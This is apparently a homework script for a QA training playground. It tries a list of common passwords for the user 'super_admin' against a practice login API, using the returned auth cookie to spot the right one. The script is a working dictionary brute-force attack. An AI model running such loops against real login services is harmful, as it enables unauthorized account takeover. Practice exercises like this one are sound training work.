import requests


# variables
user_login = "super_admin"
list_password = ['donald', '12345678', '123456789', '12345', 'qazwsx', 'mustang',
                'admin', 'password', 'access', 'qwertyuiop', 'loveme', 'qwerty',
                'letmein', 'superman', '654321', '123123', 'jesus', '666666',
                'starwars', '1234567', '555555', 'batman', 'dragon', 'flower',
                'passw0rd', '!@#$%^&*', '121212', '696969', 'aa123456', '111111',
                '1qaz2wsx', 'login', 'photoshop', '1234', 'freedom', '1234567890',
                'adobe123', 'password1', 'qwerty123', 'lovely', '888888', 'whatever',
                'abc123', 'zaq1zaq1', 'trustno1', 'sunshine', '1q2w3e4r', 'master',
                'hottie', '7777777', '000000', 'football', 'ninja', 'hello', 'princess',
                'Football', 'ashley', '123qwe', 'charlie', 'bailey', 'monkey', '123456',
                'baseball', 'welcome', 'solo', 'michael', 'iloveyou', 'azerty', 'shadow']

auth_url = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
cookie_url = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"

# execution
for password in list_password:
    user_data = {"login": user_login, "password": password}
    response1 = requests.post(auth_url, data=user_data)
    cookie_value = response1.cookies.get('auth_cookie')

    cookies = {}
    if cookie_value is not None:
        cookies = {'auth_cookie': cookie_value}
        response2 = requests.post(cookie_url, cookies=cookies)
        if response2.text == 'You are authorized':
            print(response2.text)
            print(f"Your login: {user_login}\nYour password: {password}")
            break
else:
    print("The password is not in the list")